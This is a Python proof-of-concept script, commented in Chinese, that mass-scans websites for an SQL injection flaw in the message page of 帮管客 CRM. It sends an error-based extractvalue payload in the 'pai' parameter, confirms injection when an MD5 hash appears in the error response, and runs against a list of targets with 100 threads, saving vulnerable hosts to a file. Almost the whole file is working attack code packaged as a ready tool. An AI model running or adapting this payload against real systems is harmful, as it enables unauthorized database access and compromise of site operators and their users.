# 帮管客 CRM message sql注入漏洞
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止报错

def banner():
	test="""███████╗████████╗███████╗██╗    ██╗ █████╗ ██████╗ ██████╗ 
██╔════╝╚══██╔══╝██╔════╝██║    ██║██╔══██╗██╔══██╗██╔══██╗
███████╗   ██║   █████╗  ██║ █╗ ██║███████║██████╔╝██║  ██║
╚════██║   ██║   ██╔══╝  ██║███╗██║██╔══██║██╔══██╗██║  ██║
███████║   ██║   ███████╗╚███╔███╔╝██║  ██║██║  ██║██████╔╝
╚══════╝   ╚═╝   ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
                                                           version:0.0.1 sql

	"""
	print(test)

def main():
	banner()
	parser = argparse.ArgumentParser(description="帮管客 CRM message sql注入漏洞")
	parser.add_argument("-u","--url",dest="url",type=str,help="input your url")
	parser.add_argument("-f","--file",dest="file",type=str,help="input your file path")

	args = parser.parse_args()

	if args.url and not args.file:
		poc(args.url)
	elif args.file and not args.url:
		line = []
		# print(111)
		with open(args.file,"r",encoding="utf-8") as fp:
			for i in fp.readlines():
				line.append(i.strip().replace("\n",""))
		mp=Pool(100)
		mp.map(poc,line)
		mp.close()
		mp.join()
	else:
		print(f"uage\n\t {sys.argv[0]}-h")


def poc(target):
	headers={
		'User-Agent':'Mozilla/5.0'
	}
	proxies={
		'http':"http://127.0.0.1:7890",
		'https':"http://127.0.0.1:7890"
	}
	playload="/index.php/message?page=1&pai=1%20and%20extractvalue(0x7e,concat(0x7e,(md5%2811%29),0x7e))%23&xu=desc"

	try:
		parse = requests.get(url=target+playload,headers=headers,verify=False)
		if parse.status_code == 500 and "6512bd43d9caa6e02c990b0a82652dc" in parse.text:
			print(f"[+]该站点{target}存在sql注入漏洞")
			with open("result.txt","a") as fp:
				fp.write(f"{target}"+"\n")
		else:
			print(f"[-]该站点{target}不存在sql注入漏洞")
	except Exception as e:
		print(f"[*]该站点{target}存在访问问题，请手工测试")

if __name__ == '__main__':
	main()